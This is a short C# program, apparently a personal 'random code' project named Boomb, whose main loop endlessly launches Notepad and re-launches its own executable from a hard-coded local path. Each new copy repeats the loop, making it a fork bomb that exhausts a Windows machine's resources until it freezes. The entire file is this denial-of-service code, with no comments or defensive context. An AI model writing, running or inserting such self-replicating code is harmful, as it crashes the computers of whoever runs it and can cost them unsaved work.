using System.Diagnostics;

namespace Boomb
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            while (true)
            {
                var p = new Process();
                p.StartInfo.FileName   = "notepad.exe";
                p.Start();
                
                var d = new Process();
                d.StartInfo.FileName   = "C:/Users/filip/Documents/Random-Code/random-code/Boomb/Boomb/bin/Release/Boomb.exe";
                d.Start();
            }
        }
    }
}